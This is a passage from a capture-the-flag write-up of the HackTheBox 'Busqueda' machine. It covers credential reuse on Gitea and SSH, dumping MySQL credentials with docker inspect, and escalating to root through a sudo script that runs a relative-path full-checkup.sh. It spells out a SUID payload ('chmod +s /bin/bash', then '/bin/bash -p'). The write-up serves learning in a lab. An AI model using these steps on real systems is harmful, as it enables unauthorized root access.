            data-srcset="/posts/htb/busqueda/reading-config-file.png, /posts/htb/busqueda/reading-config-file.png 1.5x, /posts/htb/busqueda/reading-config-file.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/reading-config-file.png" width="882" height="258" />
    </a><figcaption class="image-caption">found cody credentials</figcaption>
    </figure></p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/etc-hosts-2.png" title="add gitea.searcher.htb in /etc/hosts" data-thumbnail="/posts/htb/busqueda/etc-hosts-2.png" data-sub-html="<h2>add gitea.searcher.htb in /etc/hosts</h2><p>add gitea.searcher.htb in /etc/hosts</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/etc-hosts-2.png"
            data-srcset="/posts/htb/busqueda/etc-hosts-2.png, /posts/htb/busqueda/etc-hosts-2.png 1.5x, /posts/htb/busqueda/etc-hosts-2.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/etc-hosts-2.png" width="503" height="139" />
    </a><figcaption class="image-caption">add gitea.searcher.htb in /etc/hosts</figcaption>
    </figure></p>
<h2 id="http-giteasearcherhtb-cody">Http: gitea.searcher.htb (cody)</h2>
<p>Then, I navigated through the browser and successfully login as <code>cody</code>. Unfortunately, there&rsquo;s nothing that I found interesting.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/gitea-login-as-cody.png" title="login as cody in gitea" data-thumbnail="/posts/htb/busqueda/gitea-login-as-cody.png" data-sub-html="<h2>login as cody in gitea</h2><p>login as cody in gitea</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/gitea-login-as-cody.png"
            data-srcset="/posts/htb/busqueda/gitea-login-as-cody.png, /posts/htb/busqueda/gitea-login-as-cody.png 1.5x, /posts/htb/busqueda/gitea-login-as-cody.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/gitea-login-as-cody.png" width="1455" height="602" />
    </a><figcaption class="image-caption">login as cody in gitea</figcaption>
    </figure></p>
<p>However, there are <code>two</code> users on it, which is the user that I used for login now and the <code>administrator</code> user.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/gitea-show-administrator-commit.png" title="found administrator user in gitea" data-thumbnail="/posts/htb/busqueda/gitea-show-administrator-commit.png" data-sub-html="<h2>found administrator user in gitea</h2><p>found administrator user in gitea</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/gitea-show-administrator-commit.png"
            data-srcset="/posts/htb/busqueda/gitea-show-administrator-commit.png, /posts/htb/busqueda/gitea-show-administrator-commit.png 1.5x, /posts/htb/busqueda/gitea-show-administrator-commit.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/gitea-show-administrator-commit.png" width="1198" height="432" />
    </a><figcaption class="image-caption">found administrator user in gitea</figcaption>
    </figure></p>
<p>Now, I&rsquo;m curious to see if this user called <code>cody</code> exists on the box. So, I&rsquo;ll check the user and found out, only <code>two</code> users that exit.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/check-user.png" title="check user exist on the box" data-thumbnail="/posts/htb/busqueda/check-user.png" data-sub-html="<h2>check user exist on the box</h2><p>check user exist on the box</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/check-user.png"
            data-srcset="/posts/htb/busqueda/check-user.png, /posts/htb/busqueda/check-user.png 1.5x, /posts/htb/busqueda/check-user.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/check-user.png" width="467" height="161" />
    </a><figcaption class="image-caption">check user exist on the box</figcaption>
    </figure></p>
<h2 id="ssh-svc">SSH: svc</h2>
<p>From the nmap scan result above. It shows the <code>port 22</code> which is <code>SSH</code>, and it&rsquo;s open. Then, I&rsquo;ll try the credentials that I found earlier alongside the <code>svc</code> user and it works.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/ssh-as-svc.png" title="ssh as svc" data-thumbnail="/posts/htb/busqueda/ssh-as-svc.png" data-sub-html="<h2>ssh as svc</h2><p>ssh as svc</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/ssh-as-svc.png"
            data-srcset="/posts/htb/busqueda/ssh-as-svc.png, /posts/htb/busqueda/ssh-as-svc.png 1.5x, /posts/htb/busqueda/ssh-as-svc.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/ssh-as-svc.png" width="515" height="272" />
    </a><figcaption class="image-caption">ssh as svc</figcaption>
    </figure></p>
<p>Since I have the password of this user. I&rsquo;m going to check the sudo permission with the <code>sudo -l</code> command. Fair enough, I can run a python script that is located in the <code>/opt</code> directory called <code>system-checkup.py</code>.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/sudo-permission.png" title="check sudo permission" data-thumbnail="/posts/htb/busqueda/sudo-permission.png" data-sub-html="<h2>check sudo permission</h2><p>check sudo permission</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/sudo-permission.png"
            data-srcset="/posts/htb/busqueda/sudo-permission.png, /posts/htb/busqueda/sudo-permission.png 1.5x, /posts/htb/busqueda/sudo-permission.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/sudo-permission.png" width="1775" height="395" />
    </a><figcaption class="image-caption">check sudo permission</figcaption>
    </figure></p>
<h3 id="ssh-system-checkuppy-help">SSH: system-checkup.py help</h3>
<p>When I ran it, it&rsquo;s listing <code>three</code> possible commands that I could use. However, one of the commands which is <code>full-checkup</code> seems like not working or it&rsquo;s just a print function.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/system-checkup-help-menu-full-checkup-command.png" title="full-checkup not working" data-thumbnail="/posts/htb/busqueda/system-checkup-help-menu-full-checkup-command.png" data-sub-html="<h2>full-checkup not working</h2><p>full-checkup not working</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/system-checkup-help-menu-full-checkup-command.png"
            data-srcset="/posts/htb/busqueda/system-checkup-help-menu-full-checkup-command.png, /posts/htb/busqueda/system-checkup-help-menu-full-checkup-command.png 1.5x, /posts/htb/busqueda/system-checkup-help-menu-full-checkup-command.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/system-checkup-help-menu-full-checkup-command.png" width="828" height="288" />
    </a><figcaption class="image-caption">full-checkup not working</figcaption>
    </figure></p>
<h3 id="ssh-system-checkuppy-docker-ps">SSH: system-checkup.py docker-ps</h3>
<p>I executed the <code>docker-ps</code> command and it&rsquo;s showing the docker process on the machine. Surprisingly, one of the docker <code>containers</code> was an image of the <code>mysql</code> database. I&rsquo;ll try connecting to the <code>mysql</code> and it&rsquo;s failed.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/docker-ps-list.png" title="system-checkup docker-ps" data-thumbnail="/posts/htb/busqueda/docker-ps-list.png" data-sub-html="<h2>system-checkup docker-ps</h2><p>system-checkup docker-ps</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/docker-ps-list.png"
            data-srcset="/posts/htb/busqueda/docker-ps-list.png, /posts/htb/busqueda/docker-ps-list.png 1.5x, /posts/htb/busqueda/docker-ps-list.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/docker-ps-list.png" width="1852" height="224" />
    </a><figcaption class="image-caption">system-checkup docker-ps</figcaption>
    </figure></p>
<h3 id="ssh-system-checkuppy-docker-inspect">SSH: system-checkup.py docker-inspect</h3>
<p>When I executed the <code>docker-inspect</code> command, it throws an error that require some arguments.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/system-checkup-docker-inspect.png" title="system-checkup docker-inspect" data-thumbnail="/posts/htb/busqueda/system-checkup-docker-inspect.png" data-sub-html="<h2>system-checkup docker-inspect</h2><p>system-checkup docker-inspect</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/system-checkup-docker-inspect.png"
            data-srcset="/posts/htb/busqueda/system-checkup-docker-inspect.png, /posts/htb/busqueda/system-checkup-docker-inspect.png 1.5x, /posts/htb/busqueda/system-checkup-docker-inspect.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/system-checkup-docker-inspect.png" width="1194" height="225" />
    </a><figcaption class="image-caption">system-checkup docker-inspect</figcaption>
    </figure></p>
<p>So, I&rsquo;m searching in the ocean of the internet and found this <a href="https://docs.docker.com/engine/reference/commandline/inspect/" target="_blank" rel="noopener noreffer ">article</a> that talks about this particular command which is <code>docker-inspect</code>.</p>
<p>Then, I executed this command to dump the <code>config</code> file of the <code>mysql</code> database by appending the <code>container id</code> into it.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/dump-mysql-docker-config.png" title="dump mysql docker config" data-thumbnail="/posts/htb/busqueda/dump-mysql-docker-config.png" data-sub-html="<h2>dump mysql docker config</h2><p>dump mysql docker config</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/dump-mysql-docker-config.png"
            data-srcset="/posts/htb/busqueda/dump-mysql-docker-config.png, /posts/htb/busqueda/dump-mysql-docker-config.png 1.5x, /posts/htb/busqueda/dump-mysql-docker-config.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/dump-mysql-docker-config.png" width="1905" height="304" />
    </a><figcaption class="image-caption">dump mysql docker config</figcaption>
    </figure></p>
<p>Luckily, I found the admin credentials of the <code>mysql</code> database. However, when I&rsquo;ll try to connect to it. It&rsquo;s failed. So, I&rsquo;m going to execute another command to show the <code>docker</code> ip address.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/docker-ip-address.png" title="found the docker ip address" data-thumbnail="/posts/htb/busqueda/docker-ip-address.png" data-sub-html="<h2>found the docker ip address</h2><p>found the docker ip address</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/docker-ip-address.png"
            data-srcset="/posts/htb/busqueda/docker-ip-address.png, /posts/htb/busqueda/docker-ip-address.png 1.5x, /posts/htb/busqueda/docker-ip-address.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/docker-ip-address.png" width="1657" height="245" />
    </a><figcaption class="image-caption">found the docker ip address</figcaption>
    </figure></p>
<h3 id="ssh-mysql">SSH: mysql</h3>
<p>I managed to connect to it as the <code>root</code> user by supplying this ip address <code>172.19.0.3</code> as a host. Unfortunately, I can&rsquo;t find anything that interesting, and feels like I&rsquo;m stuck.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/mysql-login-as-root.png" title="connect to mysql as root" data-thumbnail="/posts/htb/busqueda/mysql-login-as-root.png" data-sub-html="<h2>connect to mysql as root</h2><p>connect to mysql as root</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/mysql-login-as-root.png"
            data-srcset="/posts/htb/busqueda/mysql-login-as-root.png, /posts/htb/busqueda/mysql-login-as-root.png 1.5x, /posts/htb/busqueda/mysql-login-as-root.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/mysql-login-as-root.png" width="787" height="344" />
    </a><figcaption class="image-caption">connect to mysql as root</figcaption>
    </figure></p>
<h2 id="http-giteasearcherhtb-administrator">Http: gitea.searcher.htb (administrator)</h2>
<p>Then, I&rsquo;ll try all the credentials that I found earlier on any input that I can find. Luckily, I managed to log in as an <code>administrator</code> user on the <code>gitea</code> page.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/administrator-gitea-repos.png" title="administrator gitea repository" data-thumbnail="/posts/htb/busqueda/administrator-gitea-repos.png" data-sub-html="<h2>administrator gitea repository</h2><p>administrator gitea repository</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/administrator-gitea-repos.png"
            data-srcset="/posts/htb/busqueda/administrator-gitea-repos.png, /posts/htb/busqueda/administrator-gitea-repos.png 1.5x, /posts/htb/busqueda/administrator-gitea-repos.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/administrator-gitea-repos.png" width="1188" height="502" />
    </a><figcaption class="image-caption">administrator gitea repository</figcaption>
    </figure></p>
<p>On top of that, <code>administrator</code> has a repository called <code>scripts</code> that contains a file called <code>system-checkup.py</code> and <code>full-checkup.sh</code>, which is <code>svc</code> user can execute it with sudo permission.</p>
<h3 id="http-giteasearcherhtb-full-checkupsh">Http: gitea.searcher.htb (full-checkup.sh)</h3>
<p>However, when I ran the <code>full-checkup</code> command earlier, it did not work and I thought maybe it was just a print function that got executed. So, I&rsquo;ll check that file, and I was completely wrong.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/source-code-of-full-checkup-command.png" title="full-checkup source code" data-thumbnail="/posts/htb/busqueda/source-code-of-full-checkup-command.png" data-sub-html="<h2>full-checkup source code</h2><p>full-checkup source code</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/source-code-of-full-checkup-command.png"
            data-srcset="/posts/htb/busqueda/source-code-of-full-checkup-command.png, /posts/htb/busqueda/source-code-of-full-checkup-command.png 1.5x, /posts/htb/busqueda/source-code-of-full-checkup-command.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/source-code-of-full-checkup-command.png" width="1155" height="736" />
    </a><figcaption class="image-caption">full-checkup source code</figcaption>
    </figure></p>
<h3 id="http-giteasearcherhtb-system-chekuppy">Http: gitea.searcher.htb (system-chekup.py)</h3>
<p>I ended up checking the <code>system-chekup.py</code> source code and I spotted the problem in <code>line 47</code>. If the user supplies the <code>full-checkup</code> command, it&rsquo;s going to execute a bash file named <code>full-checkup.sh</code> in the current directory.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/source-code-of-system-checkup.png" title="system-checkup source code" data-thumbnail="/posts/htb/busqueda/source-code-of-system-checkup.png" data-sub-html="<h2>system-checkup source code</h2><p>system-checkup source code</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/source-code-of-system-checkup.png"
            data-srcset="/posts/htb/busqueda/source-code-of-system-checkup.png, /posts/htb/busqueda/source-code-of-system-checkup.png 1.5x, /posts/htb/busqueda/source-code-of-system-checkup.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/source-code-of-system-checkup.png" width="455" height="201" />
    </a><figcaption class="image-caption">system-checkup source code</figcaption>
    </figure></p>
<p>To prove it, I&rsquo;m going to execute the command in different directories. First, at the <code>/home/svc/</code> directory, and second, it&rsquo;s going to be in the <code>/opt/scripts/</code> directory, where&rsquo;s the scripts located.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/ran-the-script-in-the-different-directory.png" title="ran the script in the different directory" data-thumbnail="/posts/htb/busqueda/ran-the-script-in-the-different-directory.png" data-sub-html="<h2>ran the script in the different directory</h2><p>ran the script in the different directory</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/ran-the-script-in-the-different-directory.png"
            data-srcset="/posts/htb/busqueda/ran-the-script-in-the-different-directory.png, /posts/htb/busqueda/ran-the-script-in-the-different-directory.png 1.5x, /posts/htb/busqueda/ran-the-script-in-the-different-directory.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/ran-the-script-in-the-different-directory.png" width="1904" height="845" />
    </a><figcaption class="image-caption">ran the script in the different directory</figcaption>
    </figure></p>
<h2 id="privesc-system-checkuppy">PrivEsc: system-checkup.py</h2>
<p>From the result above, I can create a malicious bash file called <code>full-checkup.sh</code> and execute with the sudo permission.</p>
<p>I&rsquo;m going to use a simple payload such as <code>chmod +s /bin/bash</code>, which is turn a <code>/bin/bash</code> binary into a Set UID binary. Then, I can execute as <code>/bin/bash -p</code> to get the <code>root</code> shell.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/becoming-root.png" title="becoming root" data-thumbnail="/posts/htb/busqueda/becoming-root.png" data-sub-html="<h2>becoming root</h2><p>becoming root</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/becoming-root.png"
            data-srcset="/posts/htb/busqueda/becoming-root.png, /posts/htb/busqueda/becoming-root.png 1.5x, /posts/htb/busqueda/becoming-root.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/becoming-root.png" width="856" height="420" />
    </a><figcaption class="image-caption">becoming root</figcaption>
    </figure></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 08-07-2023</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://shafiqaiman.com/posts/htb/busqueda/" data-title="HackTheBox - Busqueda Writeup" data-via="_shafiqaiman_" data-hashtags="python,mysql,gitea,rce,searchor 2.4.0,docker,docker-inspect"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://shafiqaiman.com/posts/htb/busqueda/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://shafiqaiman.com/posts/htb/busqueda/" data-title="HackTheBox - Busqueda Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://shafiqaiman.com/posts/htb/busqueda/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/python/">python</a>,&nbsp;<a href="/tags/mysql/">mysql</a>,&nbsp;<a href="/tags/gitea/">gitea</a>,&nbsp;<a href="/tags/rce/">rce</a>,&nbsp;<a href="/tags/searchor-2.4.0/">searchor 2.4.0</a>,&nbsp;<a href="/tags/docker/">docker</a>,&nbsp;<a href="/tags/docker-inspect/">docker-inspect</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/htb/sense/" class="prev" rel="prev" title="HackTheBox - Sense Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Sense Writeup</a>
            <a href="/posts/htb/monitorstwo/" class="next" rel="next" title="HackTheBox - MonitorsTwo Writeup">HackTheBox - MonitorsTwo Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
